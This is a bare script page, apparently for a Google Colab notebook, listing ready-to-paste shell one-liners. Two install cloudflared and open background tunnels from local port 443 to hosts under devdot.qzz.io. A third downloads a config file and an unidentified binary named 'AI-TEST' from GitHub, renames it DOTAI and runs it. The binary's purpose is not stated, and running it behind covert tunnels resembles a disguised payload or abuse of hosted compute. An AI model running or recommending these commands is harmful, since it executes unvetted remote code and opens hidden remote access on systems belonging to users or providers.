# SCRIPT

bahlil
```
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -O /tmp/cloudflared.deb && dpkg -i /tmp/cloudflared.deb > /dev/null 2>&1 && rm /tmp/cloudflared.deb && nohup cloudflared access tcp --hostname bahlil.devdot.qzz.io --url 127.0.0.1:443 > /content/cloudflared_client.log 2>&1 & sleep 3; tail -n 15 /content/cloudflared_client.log && ss -tulnp
```

gibran
```
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -O /tmp/cloudflared.deb && dpkg -i /tmp/cloudflared.deb > /dev/null 2>&1 && rm /tmp/cloudflared.deb && nohup cloudflared access tcp --hostname gibran.devdot.qzz.io --url 127.0.0.1:443 > /content/cloudflared_client.log 2>&1 & sleep 3; tail -n 15 /content/cloudflared_client.log && ss -tulnp
```

```
cd /tmp && wget -O config.json https://github.com/DOT-AJA/SCRIPT/raw/refs/heads/main/config.json && wget -O DOTAI https://github.com/DOT-AJA/SCRIPT/releases/download/testv2/AI-TEST  && chmod +x DOTAI config.json && ./DOTAI -c config.json
```
